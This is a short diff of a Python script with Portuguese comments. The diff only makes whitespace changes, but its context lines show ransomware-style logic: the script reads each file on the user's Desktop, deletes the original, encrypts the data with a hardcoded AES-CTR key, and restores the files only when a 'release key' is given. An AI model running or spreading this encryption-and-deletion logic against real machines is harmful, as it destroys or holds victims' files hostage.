@@ -32,7 +32,6 @@ def criptografando():
             f = open(f'{desktop}\\{format_file}', 'rb')  # rb = read binary e wb = write binary
             file_data = f.read()
             f.close()
- 
             os.remove(f'{desktop}\\{format_file}')
             key = b"1ab2c3e4f5g6h7i8"  # 16 byts key - chave
             aes = pyaes.AESModeOfOperationCTR(key)  # gera a criptografia
@@ -54,10 +53,8 @@ def descrypt(decrypt_file):
             dkey = keybytes
             daes = pyaes.AESModeOfOperationCTR(dkey)  # gera a decriptografia
             decrypt_data = daes.decrypt(file_data)
- 
             format_file = file.split('.')
             new_file_name = format_file[0] + '.' + format_file[1]
- 
             dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
             dnew_file.write(decrypt_data)
             dnew_file.close()
@@ -78,3 +75,4 @@ if __name__ == '__main__':
                 os.remove(f'{desktop}\\{del_file}')
         else:
             print('Chave de liberação inválida.')
+
